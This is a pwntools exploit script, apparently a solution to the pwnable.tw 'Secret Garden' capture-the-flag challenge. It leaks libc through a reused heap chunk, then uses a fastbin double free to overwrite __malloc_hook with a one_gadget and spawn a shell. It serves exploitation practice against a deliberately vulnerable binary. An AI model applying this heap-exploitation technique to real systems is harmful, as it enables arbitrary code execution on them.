#!/usr/bin/env python3

from pwn import *

exe = ELF("./secretgarden_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


if args.LOCAL:
	r = process([exe.path])
	#if args.DEBUG:
	#gdb.attach(r, gdbscript='''
	#	start
	#	''')
else:
	r = remote("chall.pwnable.tw", 10203)



def raise_flower(length_of_name, name_flower):
	r.sendafter(b"choice :", b"1")
	r.sendlineafter(b"Length of the name :", f"{length_of_name}".encode())
	r.sendafter(b"The name of flower :", name_flower)
	r.sendlineafter(b"color of the flower :", b"A"*22)
def visit_garden():
	r.sendafter(b"choice :", b"2\x00")
def remove_flower(index):
	r.sendafter(b"choice :", b"3\x00")
	r.sendlineafter(b"remove from the garden:", f"{index}".encode())







def main():


	# Stage 1: Leak libc
	raise_flower(0x400, b"rose") # index 0
	raise_flower(0x10, b"abc") # index 1, avoid consolidating with top chunk
	remove_flower(0)
	raise_flower(0x3d8, b"A"*8) # index 2
	visit_garden()
	#r.interactive()
	r.recvuntil(b"Name of the flower[2] :AAAAAAAA")
	#r.recvline()
	libc.address = u64(r.recv(6) + b"\x00\x00") - 0x3c3b78
	print("[*] libc: ", hex(libc.address))


	# Stage 2: target __malloc_hook()

	remove_flower(2)

	raise_flower(0x68, b"lily") # index 3
	raise_flower(0x68, b"orchid") # index 4
	
	#visit_garden() 
	
	remove_flower(3)
	remove_flower(4)
	remove_flower(3)
	# fastbin[size=0x70] -> "lily" chunk -> "orchid" chunk -> "lily" chunk

	malloc_hook = libc.sym['__malloc_hook']
	one_gadget = libc.address+0xef6c4
	arena = libc.address + 0x3c3b48
	print("[*] __malloc_hook: ", hex(malloc_hook))
	print("[*] one_gadget: ", hex(one_gadget))
	print("[*] arena for debug: ", hex(arena))

	raise_flower(0x68, p64(malloc_hook-0x23))
	# fastbin[size=0x70] -> "orchid" chunk -> "lily" chunk -> &__malloc_hook+0x13
	raise_flower(0x68, b"nope ")

	#fastbin[size=0x70] -> "lily" chunk -> &__malloc_hook+0x13
	raise_flower(0x68, b"nope")
	# fastbin[size=0x70] -> &__malloc_hook+0x13
	
	raise_flower(0x68, b"A"*0x13 + p64(one_gadget)+b"\n")
	# __malloc_hook = one_gadget
	
	remove_flower(5)
	remove_flower(5)

	# good luck pwning :)

	r.interactive()


if __name__ == "__main__":
	main()
